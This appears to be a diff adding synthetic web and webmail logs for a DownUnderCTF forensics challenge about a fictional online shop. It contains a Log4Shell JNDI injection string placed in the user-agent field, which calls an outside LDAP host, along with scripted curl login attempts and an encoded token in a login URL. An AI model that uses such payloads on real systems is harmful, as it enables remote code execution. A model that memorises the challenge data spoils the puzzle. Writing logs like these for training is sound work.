+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com",
+    "useragent": "Opera/9.12 (X11; Linux x86_64; sl-SI) Presto/2.9.351 Version/10.00",
+    "url": "shop.downunderctf.com/browse",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:23:02.000+0000",
+    "origin": "101.162.218.76",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/browse",
+    "useragent": "Opera/9.12 (X11; Linux x86_64; sl-SI) Presto/2.9.351 Version/10.00",
+    "url": "shop.downunderctf.com/product?id=4",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:23:09.000+0000",
+    "origin": "101.162.218.76",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/product?id=4",
+    "useragent": "Opera/9.12 (X11; Linux x86_64; sl-SI) Presto/2.9.351 Version/10.00",
+    "url": "shop.downunderctf.com/product?id=2",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:23:31.000+0000",
+    "origin": "101.162.218.76",
+    "site": "shop.downunderctf.com",
+    "method": "POST",
+    "referer": "shop.downunderctf.com/product?id=2",
+    "useragent": "Opera/9.12 (X11; Linux x86_64; sl-SI) Presto/2.9.351 Version/10.00",
+    "url": "shop.downunderctf.com/product?id=2",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:23:35.000+0000",
+    "origin": "101.162.218.76",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/product?id=2",
+    "useragent": "Opera/9.12 (X11; Linux x86_64; sl-SI) Presto/2.9.351 Version/10.00",
+    "url": "shop.downunderctf.com/browse",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:23:47.000+0000",
+    "origin": "101.162.218.76",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/browse",
+    "useragent": "Opera/9.12 (X11; Linux x86_64; sl-SI) Presto/2.9.351 Version/10.00",
+    "url": "shop.downunderctf.com/product?id=1",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:23:49.000+0000",
+    "origin": "101.162.218.76",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/browse",
+    "useragent": "Opera/9.12 (X11; Linux x86_64; sl-SI) Presto/2.9.351 Version/10.00",
+    "url": "shop.downunderctf.com/product?id=2",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:23:54.000+0000",
+    "origin": "101.162.218.76",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/product?id=2",
+    "useragent": "Opera/9.12 (X11; Linux x86_64; sl-SI) Presto/2.9.351 Version/10.00",
+    "url": "shop.downunderctf.com/checkout",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:24:08.000+0000",
+    "origin": "101.162.218.76",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/checkout",
+    "useragent": "Opera/9.12 (X11; Linux x86_64; sl-SI) Presto/2.9.351 Version/10.00",
+    "url": "shop.downunderctf.com/register",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:24:57.000+0000",
+    "origin": "101.162.218.76",
+    "site": "shop.downunderctf.com",
+    "method": "POST",
+    "referer": "shop.downunderctf.com/register",
+    "useragent": "Opera/9.12 (X11; Linux x86_64; sl-SI) Presto/2.9.351 Version/10.00",
+    "url": "shop.downunderctf.com/register",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:24:59.000+0000",
+    "origin": "101.162.218.76",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/register",
+    "useragent": "Opera/9.12 (X11; Linux x86_64; sl-SI) Presto/2.9.351 Version/10.00",
+    "url": "shop.downunderctf.com/checkout",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:25:22.000+0000",
+    "origin": "101.162.218.76",
+    "site": "shop.downunderctf.com",
+    "method": "POST",
+    "referer": "shop.downunderctf.com/checkout",
+    "useragent": "Opera/9.12 (X11; Linux x86_64; sl-SI) Presto/2.9.351 Version/10.00",
+    "url": "shop.downunderctf.com/checkout",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:25:28.000+0000",
+    "origin": "101.162.218.76",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/checkout",
+    "useragent": "Opera/9.12 (X11; Linux x86_64; sl-SI) Presto/2.9.351 Version/10.00",
+    "url": "shop.downunderctf.com/orderconfirm",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:29:16.000+0000",
+    "origin": "101.162.218.76",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "downunderctf.com",
+    "useragent": "Mozilla/5.0 (iPad; CPU OS 8_2_2 like Mac OS X; en-US) AppleWebKit/531.14.4 (KHTML, like Gecko) Version/4.0.5 Mobile/8B113 Safari/6531.14.4",
+    "url": "shop.downunderctf.com",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:39:38.000+0000",
+    "origin": "101.183.87.133",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "downunderctf.com",
+    "useragent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_5_9 rv:5.0) Gecko/20211215 Firefox/36.0",
+    "url": "shop.downunderctf.com",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:39:56.000+0000",
+    "origin": "101.183.87.133",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com",
+    "useragent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_5_9 rv:5.0) Gecko/20211215 Firefox/36.0",
+    "url": "shop.downunderctf.com/browse",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:40:22.000+0000",
+    "origin": "101.183.87.133",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/browse",
+    "useragent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_5_9 rv:5.0) Gecko/20211215 Firefox/36.0",
+    "url": "shop.downunderctf.com/product?id=1",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:41:13.000+0000",
+    "origin": "101.183.87.133",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/product?id=1",
+    "useragent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_5_9 rv:5.0) Gecko/20211215 Firefox/36.0",
+    "url": "shop.downunderctf.com/product?id=8",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:41:45.000+0000",
+    "origin": "101.183.87.133",
+    "site": "shop.downunderctf.com",
+    "method": "POST",
+    "referer": "shop.downunderctf.com/product?id=8",
+    "useragent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_5_9 rv:5.0) Gecko/20211215 Firefox/36.0",
+    "url": "shop.downunderctf.com/product?id=8",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:42:02.000+0000",
+    "origin": "101.183.87.133",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/product?id=8",
+    "useragent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_5_9 rv:5.0) Gecko/20211215 Firefox/36.0",
+    "url": "shop.downunderctf.com/checkout",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:42:19.000+0000",
+    "origin": "101.183.87.133",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/checkout",
+    "useragent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_5_9 rv:5.0) Gecko/20211215 Firefox/36.0",
+    "url": "shop.downunderctf.com/register",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:46:51.000+0000",
+    "origin": "101.183.127.167",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "duckduckgo.com/?q=ductf+shop",
+    "useragent": "Mozilla/5.0 (Windows NT 4.0) AppleWebKit/5351 (KHTML, like Gecko) Chrome/36.0.803.0 Mobile Safari/5351",
+    "url": "shop.downunderctf.com",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:46:58.000+0000",
+    "origin": "101.183.127.167",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com",
+    "useragent": "Mozilla/5.0 (Windows NT 4.0) AppleWebKit/5351 (KHTML, like Gecko) Chrome/36.0.803.0 Mobile Safari/5351",
+    "url": "shop.downunderctf.com/browse",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:47:08.000+0000",
+    "origin": "101.183.127.167",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/browse",
+    "useragent": "Mozilla/5.0 (Windows NT 4.0) AppleWebKit/5351 (KHTML, like Gecko) Chrome/36.0.803.0 Mobile Safari/5351",
+    "url": "shop.downunderctf.com/product?=1",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:40:41.000+0000",
+    "origin": "58.164.62.91",
+    "site": "shop.downunderctf.com",
+    "method": "POST",
+    "referer": "shop.downunderctf.com/changepassword",
+    "useragent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.36 Safari/537.36",
+    "url": "shop.downunderctf.com/changepassword",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:40:43.000+0000",
+    "origin": "58.164.62.91",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/changepassword",
+    "useragent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.36 Safari/537.36",
+    "url": "shop.downunderctf.com/login?ref=N2E1ODFhYzRkOGNiM2JmYzU5NmZjZTlhZmIxMTVmZDI6NmQ3YzViM2U3OTZkODMzYjNmZGQ0MGY0Y2U1N2ZhY2Q%3D",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:26:52.000+0000",
+    "sender": "noreply@shop.downunderctf.com",
+    "recipient": "cake@shop.downunderctf.com",
+    "direction": "Outgoing",
+    "outcome": "Unknown",
+    "subject": "Your shop.downunderctf.com Password Has Been Changed",
+    "attachments": "null",
+    "logSource": "Webmail"
+} {
+    "_time": "2021-01-01T09:26:52.000+0000",
+    "sender": "noreply@shop.downunderctf.com",
+    "recipient": "cake@shop.downunderctf.com",
+    "direction": "Incoming",
+    "outcome": "Delivered",
+    "subject": "Your shop.downunderctf.com Password Has Been Changed",
+    "attachments": "null",
+    "logSource": "Webmail"
+} {
+    "_time": "2021-01-01T09:44:27.000+0000",
+    "origin": "101.186.67.24",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "https://www.google.com/search?hl=en&q=shop%20ductf",
+    "useragent": "Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 5.2; Trident/3.0)",
+    "url": "shop.downunderctf.com",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:44:47.000+0000",
+    "origin": "101.186.67.24",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com",
+    "useragent": "Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 5.2; Trident/3.0)",
+    "url": "shop.downunderctf.com/register",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:45:21.000+0000",
+    "origin": "101.186.67.24",
+    "site": "shop.downunderctf.com",
+    "method": "POST",
+    "referer": "shop.downunderctf.com/register",
+    "useragent": "Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 5.2; Trident/3.0)",
+    "url": "shop.downunderctf.com/register",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:45:23.000+0000",
+    "origin": "101.186.67.24",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/register",
+    "useragent": "Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 5.2; Trident/3.0)",
+    "url": "shop.downunderctf.com",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:45:27.000+0000",
+    "origin": "101.186.67.24",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com",
+    "useragent": "Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 5.2; Trident/3.0)",
+    "url": "shop.downunderctf.com/browse",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:46:01.000+0000",
+    "origin": "101.186.67.24",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/browse",
+    "useragent": "Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 5.2; Trident/3.0)",
+    "url": "shop.downunderctf.com/product?id=3",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:47:33.000+0000",
+    "origin": "101.186.67.24",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/product?id=3",
+    "useragent": "Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 5.2; Trident/3.0)",
+    "url": "shop.downunderctf.com/product?id=4",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:48:05.000+0000",
+    "origin": "101.186.67.24",
+    "site": "shop.downunderctf.com",
+    "method": "POST",
+    "referer": "shop.downunderctf.com/product?id=4",
+    "useragent": "Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 5.2; Trident/3.0)",
+    "url": "shop.downunderctf.com/product?id=4",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:48:13.000+0000",
+    "origin": "101.186.67.24",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/product?id=4",
+    "useragent": "Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 5.2; Trident/3.0)",
+    "url": "shop.downunderctf.com/browse",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:48:52.000+0000",
+    "origin": "101.186.67.24",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/browse",
+    "useragent": "Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 5.2; Trident/3.0)",
+    "url": "shop.downunderctf.com/product?id=8",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:47:28.000+0000",
+    "origin": "101.183.127.167",
+    "site": "shop.downunderctf.com",
+    "method": "POST",
+    "referer": "shop.downunderctf.com/product?id=1",
+    "useragent": "Mozilla/5.0 (Windows NT 4.0) AppleWebKit/5351 (KHTML, like Gecko) Chrome/36.0.803.0 Mobile Safari/5351",
+    "url": "shop.downunderctf.com/product?id=1",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:47:35.000+0000",
+    "origin": "101.183.127.167",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/product?id=1",
+    "useragent": "Mozilla/5.0 (Windows NT 4.0) AppleWebKit/5351 (KHTML, like Gecko) Chrome/36.0.803.0 Mobile Safari/5351",
+    "url": "shop.downunderctf.com/browse",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:47:40.000+0000",
+    "origin": "101.183.127.167",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/browse",
+    "useragent": "Mozilla/5.0 (Windows NT 4.0) AppleWebKit/5351 (KHTML, like Gecko) Chrome/36.0.803.0 Mobile Safari/5351",
+    "url": "shop.downunderctf.com/product?id=3",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:47:59.000+0000",
+    "origin": "101.183.127.167",
+    "site": "shop.downunderctf.com",
+    "method": "POST",
+    "referer": "shop.downunderctf.com/product?id=3",
+    "useragent": "Mozilla/5.0 (Windows NT 4.0) AppleWebKit/5351 (KHTML, like Gecko) Chrome/36.0.803.0 Mobile Safari/5351",
+    "url": "shop.downunderctf.com/product?id=3",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:48:17.000+0000",
+    "origin": "101.183.127.167",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/product?id=3",
+    "useragent": "Mozilla/5.0 (Windows NT 4.0) AppleWebKit/5351 (KHTML, like Gecko) Chrome/36.0.803.0 Mobile Safari/5351",
+    "url": "shop.downunderctf.com/checkout",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:25:46.000+0000",
+    "origin": "58.164.62.91",
+    "site": "shop.downunderctf.com",
+    "method": "POST",
+    "referer": "null",
+    "useragent": "curl/7.64.1",
+    "url": "shop.downunderctf.com/login",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:25:47.000+0000",
+    "origin": "58.164.62.91",
+    "site": "shop.downunderctf.com",
+    "method": "POST",
+    "referer": "null",
+    "useragent": "curl/7.64.1",
+    "url": "shop.downunderctf.com/login",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:25:48.000+0000",
+    "origin": "58.164.62.91",
+    "site": "shop.downunderctf.com",
+    "method": "POST",
+    "referer": "null",
+    "useragent": "curl/7.64.1",
+    "url": "shop.downunderctf.com/login",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:48:41.000+0000",
+    "origin": "101.183.127.167",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/checkout",
+    "useragent": "Mozilla/5.0 (Windows NT 4.0) AppleWebKit/5351 (KHTML, like Gecko) Chrome/36.0.803.0 Mobile Safari/5351",
+    "url": "shop.downunderctf.com/login",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:49:12.000+0000",
+    "origin": "101.183.127.167",
+    "site": "shop.downunderctf.com",
+    "method": "POST",
+    "referer": "shop.downunderctf.com/login",
+    "useragent": "Mozilla/5.0 (Windows NT 4.0) AppleWebKit/5351 (KHTML, like Gecko) Chrome/36.0.803.0 Mobile Safari/5351",
+    "url": "shop.downunderctf.com/login",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:49:15.000+0000",
+    "origin": "101.183.127.167",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/login",
+    "useragent": "Mozilla/5.0 (Windows NT 4.0) AppleWebKit/5351 (KHTML, like Gecko) Chrome/36.0.803.0 Mobile Safari/5351",
+    "url": "shop.downunderctf.com/checkout",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:50:27.000+0000",
+    "origin": "101.183.127.167",
+    "site": "shop.downunderctf.com",
+    "method": "POST",
+    "referer": "shop.downunderctf.com/checkout",
+    "useragent": "Mozilla/5.0 (Windows NT 4.0) AppleWebKit/5351 (KHTML, like Gecko) Chrome/36.0.803.0 Mobile Safari/5351",
+    "url": "shop.downunderctf.com/checkout",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:50:29.000+0000",
+    "origin": "101.183.127.167",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/checkout",
+    "useragent": "Mozilla/5.0 (Windows NT 4.0) AppleWebKit/5351 (KHTML, like Gecko) Chrome/36.0.803.0 Mobile Safari/5351",
+    "url": "shop.downunderctf.com/orderconfirm",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:55:46.000+0000",
+    "origin": "101.169.194.76",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "downunderctf.com",
+    "useragent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/5311 (KHTML, like Gecko) Chrome/39.0.806.0 Mobile Safari/5311",
+    "url": "shop.downunderctf.com",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:56:02.000+0000",
+    "origin": "101.169.194.76",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com",
+    "useragent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/5311 (KHTML, like Gecko) Chrome/39.0.806.0 Mobile Safari/5311",
+    "url": "shop.downunderctf.com/browse",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:56:37.000+0000",
+    "origin": "101.169.194.76",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/browse",
+    "useragent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/5311 (KHTML, like Gecko) Chrome/39.0.806.0 Mobile Safari/5311",
+    "url": "shop.downunderctf.com",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:25:07.000+0000",
+    "origin": "101.190.25.29",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "google.com/search?hl=en&q=downunderctf%20shop",
+    "useragent": "Mozilla/5.0 (Windows NT 4.0) AppleWebKit/5361 (KHTML, like Gecko) Chrome/40.0.841.0 Mobile Safari/5361",
+    "url": "shop.downunderctf.com",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:25:21.000+0000",
+    "origin": "101.190.25.29",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com",
+    "useragent": "Mozilla/5.0 (Windows NT 4.0) AppleWebKit/5361 (KHTML, like Gecko) Chrome/40.0.841.0 Mobile Safari/5361",
+    "url": "shop.downunderctf.com/browse",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:18:45.000+0000",
+    "origin": "106.69.37.132",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "downunderctf.com",
+    "useragent": "Mozilla/5.0 (compatible; MSIE 6.0; Windows 98; Trident/5.1)",
+    "url": "shop.downunderctf.com",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:18:55.000+0000",
+    "origin": "106.69.37.132",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com",
+    "useragent": "Mozilla/5.0 (compatible; MSIE 6.0; Windows 98; Trident/5.1)",
+    "url": "shop.downunderctf.com/browse",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:19:06.000+0000",
+    "origin": "106.69.37.132",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/browse",
+    "useragent": "Mozilla/5.0 (compatible; MSIE 6.0; Windows 98; Trident/5.1)",
+    "url": "shop.downunderctf.com/product?id=8",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:19:10.000+0000",
+    "origin": "106.69.37.132",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/browse",
+    "useragent": "Mozilla/5.0 (compatible; MSIE 6.0; Windows 98; Trident/5.1)",
+    "url": "shop.downunderctf.com/product?id=2",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:19:14.000+0000",
+    "origin": "106.69.37.132",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/browse",
+    "useragent": "Mozilla/5.0 (compatible; MSIE 6.0; Windows 98; Trident/5.1)",
+    "url": "shop.downunderctf.com/product?id=7",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:19:21.000+0000",
+    "origin": "106.69.37.132",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/browse",
+    "useragent": "Mozilla/5.0 (compatible; MSIE 6.0; Windows 98; Trident/5.1)",
+    "url": "shop.downunderctf.com/product?id=1",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:19:34.000+0000",
+    "origin": "106.69.37.132",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/browse",
+    "useragent": "Mozilla/5.0 (compatible; MSIE 6.0; Windows 98; Trident/5.1)",
+    "url": "shop.downunderctf.com/product?id=3",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:42:49.000+0000",
+    "origin": "144.48.37.43",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com",
+    "useragent": "${jndi:ldap://114:115.235.249/load}",
+    "url": "shop.downunderctf.com",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:42:50.000+0000",
+    "origin": "144.48.37.43",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com",
+    "useragent": "${jndi:ldap://114:115.235.249/load}",
+    "url": "shop.downunderctf.com/browse",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:42:51.000+0000",
+    "origin": "144.48.37.43",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/checkout",
+    "useragent": "${jndi:ldap://114:115.235.249/load}",
+    "url": "shop.downunderctf.com",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:25:52.000+0000",
+    "origin": "101.190.25.29",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/browse",
+    "useragent": "Mozilla/5.0 (Windows NT 4.0) AppleWebKit/5361 (KHTML, like Gecko) Chrome/40.0.841.0 Mobile Safari/5361",
+    "url": "shop.downunderctf.com/product?id=2",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:25:52.000+0000",
+    "origin": "101.190.25.29",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/browse",
+    "useragent": "Mozilla/5.0 (Windows NT 4.0) AppleWebKit/5361 (KHTML, like Gecko) Chrome/40.0.841.0 Mobile Safari/5361",
+    "url": "shop.downunderctf.com/product?id=3",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:25:52.000+0000",
+    "origin": "101.190.25.29",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/browse",
+    "useragent": "Mozilla/5.0 (Windows NT 4.0) AppleWebKit/5361 (KHTML, like Gecko) Chrome/40.0.841.0 Mobile Safari/5361",
+    "url": "shop.downunderctf.com/product?id=7",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:27:42.000+0000",
+    "origin": "101.190.25.29",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/product?id=7",
+    "useragent": "Mozilla/5.0 (Windows NT 4.0) AppleWebKit/5361 (KHTML, like Gecko) Chrome/40.0.841.0 Mobile Safari/5361",
+    "url": "shop.downunderctf.com/browse",
+    "logSource": "Http:Web"
+}
